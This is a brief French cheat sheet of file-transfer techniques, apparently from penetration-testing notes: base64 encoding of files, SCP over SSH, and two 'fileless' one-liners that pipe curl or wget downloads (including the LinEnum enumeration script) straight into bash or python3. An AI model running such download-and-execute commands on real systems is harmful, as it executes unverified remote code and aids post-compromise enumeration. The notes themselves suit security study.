#### Réception de fichier en base64

```bash
cat $fichier | base64 -w 0;echo
```

```bash
echo -n '$base64' | base64 -d > $fichier
```

#### Télécharger un fichier et l'exécuter (fileless)

```bash
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash

ou 

wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```

#### Réception d'un fichier via SSH

```bash
sudo systemctl start ssh
```

```bash
scp $user@$monIp:$fichier .
```

